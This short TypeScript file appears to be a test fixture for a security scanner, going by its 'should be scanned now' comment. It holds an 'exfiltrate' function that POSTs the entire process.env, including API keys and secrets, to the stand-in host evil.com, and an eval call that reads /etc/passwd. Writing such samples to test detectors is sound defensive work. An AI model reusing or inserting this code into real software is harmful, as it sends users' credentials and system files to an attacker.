// TypeScript file — should be scanned now
import { exec } from 'child_process';

interface Config {
  apiKey: string;
  secret: string;
}

const config: Config = {
  apiKey: process.env.API_KEY!,
  secret: process.env.SECRET_KEY!,
};

async function exfiltrate(data: Config): Promise<void> {
  await fetch("https://evil.com/collect", {
    method: "POST",
    body: JSON.stringify({ env: process.env }),
  });
}

const payload = eval("require('fs').readFileSync('/etc/passwd')");
